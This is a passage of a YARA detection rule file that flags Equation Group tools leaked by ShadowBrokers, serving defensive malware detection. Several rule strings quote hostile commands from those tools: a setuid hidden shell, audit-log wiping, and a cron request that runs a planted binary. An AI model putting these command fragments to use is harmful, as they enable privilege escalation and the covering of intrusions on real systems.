{\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')\" fullword ascii\n      $x2 = \"client_auth = binascii.hexlify(lo_execute('openssl rand 16'))\" fullword ascii\n   condition: \n      ( filesize < 3KB and all of them )\n}\n\nrule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1_RID3920 : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_cursesleepy_mswin32_v_1_0_0_RID36EC : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:16:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"A}%j,R\" fullword ascii\n      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } \n      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule EquationGroup_cursehelper_win2k_i686_v_2_2_0_RID37A1 : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}\" fullword ascii\n      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } \n      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}\n\nrule EquationGroup_morerats_client_addkey_RID35DF : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"print '  -s storebin  use storebin as the Store executable\\\\n'\" fullword ascii\n      $x2 = \"os.system('%s --file=\\\"%s\\\" --wipe > /dev/null' % (storebin, b))\" fullword ascii\n      $x3 = \"print '  -k keyfile   the key text file to inject'\" fullword ascii\n   condition: \n      ( filesize < 20KB and 1 of them )\n}\n\nrule EquationGroup_noclient_3_3_2_RID31D4 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 13:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3cf0eb010c431372af5f32e2ee8c757831215f8836cabc7d805572bb5574fc72\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning\" fullword ascii\n      $x2 = \"iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;\" fullword ascii\n      $x3 = \"noclient: failed to execute %s: %s\" fullword ascii\n      $x4 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n      $s5 = \"Attempting connection from 0.0.0.0:\" ascii\n   condition: \n      ( filesize < 1000KB and 1 of them )\n}\n\nrule EquationGroup_curseflower_mswin32_v_1_0_0_RID36E9 : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fdc452629ff7befe02adea3a135c3744d8585af890a4301b2a10a817e48c5cbf\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<pVt,<et(<st$<ct$<nt\" fullword ascii\n      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_tmpwatch_RID302B : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 12:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"chown root:root /tmp/.scsi/dev/bin/gsh\" fullword ascii\n      $s2 = \"chmod 4777 /tmp/.scsi/dev/bin/gsh\" fullword ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}\n\nrule EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"_lib_version\" ascii\n      $s2 = \",%02d%03d\" fullword ascii\n      $s3 = \"TRANSIT\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_morerats_client_noprep_RID3601 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"storestr = 'echo -n \\\"%s\\\" | Store --nullterminate --file=\\\"%s\\\" --set=\\\"%s\\\"' % (nopenargs, outfile, VAR_NAME)\" fullword ascii\n      $x2 = \"The NOPEN-args provided are injected into infile if it is a valid\" fullword ascii\n      $x3 = \" -i                do not autokill after 5 hours\" fullword ascii\n   condition: \n      ( filesize < 9KB and 1 of them )\n}\n\nrule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 18:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \",%02d%03d\" fullword ascii\n      $s2 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s3 = \"__strtoll_internal\" ascii\n      $s4 = \"__strtoul_internal\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 19:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"EFDGHIJKLMNOPQRSUT\" fullword ascii\n      $s2 = \"G8HcJ HcF LcF0LcN\" fullword ascii\n      $s3 = \"GhHcJ0HcF@LcF0LcN8H\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them )\n}\n\nrule EquationGroup_watcher_solaris_i386_v_3_3_0_RID36FE : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"395ec2531970950ffafde234dded0cce0c95f1f9a22763d1d04caa060a5222bb\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"getexecname\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s6 = \"__fpstart\" ascii\n      $s12 = \"GHFIJKLMNOPQRSTUVXW\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )\n}\n\nrule EquationGroup_gr_dev_bin_now_RID3285 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 14:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f5ed8312fc6e624b04e1e2d6614f3c651c9e9902ff41f4d069c32caca0869fa4\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"HTTP_REFERER=\\\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\\\"\" fullword ascii\n      $x2 = \"exec /usr/share/redmin/cgi/redmin\" fullword ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}\n\nrule EquationGroup_gr_dev_bin_post_RID32F7 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 14:27:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005\" ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}\n\nrule EquationGroup_curseyo_win2k_v_1_0_0_RID349A : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0123456789abcdefABCEDF:\" fullword ascii\n      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } \n      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } \n      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_gr_RID2D9C : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if [ -f /tmp/tmpwatch ] ; then\" fullword ascii\n      $s2 = \"echo \\\"bailing. try a different name\\\"\" fullword ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}\n\nrule EquationGroup_curseroot_win2k_v_2_1_0_RID3578 : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } \n      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } \n      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and 2 of ( $op* ) )\n}\n\nrule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k_RID40E0 : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 00:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225\"\n      hash2 = \"7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $s3 = \",%02d%03d\" fullword ascii\n      $s4 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } \n      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } \n      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}\n\nrule EquationGroup_watcher_linux_i386_v_3_3_0_RID3631 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"invalid option `\" fullword ascii\n      $s8 = \"readdir64\" fullword ascii\n      $s9 = \"89:z89:%r%opw\" fullword wide\n      $s13 = \"Ropopoprstuvwypypop\" fullword wide\n      $s17 = \"Missing argument for `-x'.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )\n}\n\nrule EquationGroup_charm_saver_win2k_v_2_0_0_RID361C : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } \n      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_cursehappy_win2k_v_6_1_0_RID35DA : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } \n      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_morerats_client_Store_RID357A : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Failed to mmap file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"Missing argument for `-x'.\" fullword ascii\n      $s4 = \"[!] Value has size of 0!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and 2 of them )\n}\n\nrule EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"forceprismheader\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s3 = \"forceprism\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 900KB and all of them )\n}\n\nrule EquationGroup_linux_exactchange_RID33CD : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6\"\n      hash2 = \"6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec\"\n      hash3 = \"39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] looking for vulnerable socket\" fullword ascii\n      $x2 = \"can't use 32-bit exploit on 64-bit target\" fullword ascii\n      $x3 = \"[+] %s socket ready, exploiting...\" fullword ascii\n      $x4 = \"[!] nothing looks vulnerable, trying everything\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )\n}\n\nrule EquationGroup_x86_linux_exactchange_RID3512 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6\"\n      hash2 = \"6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"kernel has 4G/4G split, not exploitable\" fullword ascii\n      $x2 = \"[+] kernel stack size is %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and 1 of them )\n}\n\nrule EquationGroup_emptycriss_RID3116 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file emptycriss\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"./emptycriss <target IP>\" fullword ascii\n      $s2 = \"Cut and paste the following to the telnet prompt:\" fullword ascii\n      $s8 = \"environ define TTYPROMPT abcdef\" fullword ascii\n   condition: \n      ( filesize < 50KB and 1 of them )\n}\n\nrule EquationGroup_scripme_RID2FB6 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scripme\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"running \\\\\\\"tcpdump -n -n\\\\\\\", on the environment variable \\\\$INTERFACE, scripted\" fullword ascii\n      $x2 = \"Cannot read $opetc/scripme.override -- are you root?\" ascii\n      $x3 = \"$ENV{EXPLOIT_SCRIPME}\" ascii\n      $x4 = \"$opetc/scripme.override\" ascii\n   condition: \n      ( filesize < 30KB and 1 of them )\n}\n\nrule EquationGroup_cryptTool_RID3093 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cryptTool\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The encryption key is \" fullword ascii\n      $s2 = \"___tempFile2.out\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_dumppoppy_RID30B1 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file dumppoppy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Unless the -c (clobber) option is used, if two RETR commands of the\" fullword ascii\n      $x2 = \"mywarn(\\\"End of $destfile determined by \\\\\\\"^Connection closed by foreign host\\\\\\\"\\\")\" fullword ascii\n      $l1 = \"End of $destfile determined by \\\"^Connection closed by foreign host\" \n   condition: \n      ( filesize < 20KB and 1 of them )\n}\n\nrule EquationGroup_Auditcleaner_RID3194 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"> /var/log/audit/audit.log; rm -f .\" ascii\n      $x2 = \"Pastables to run 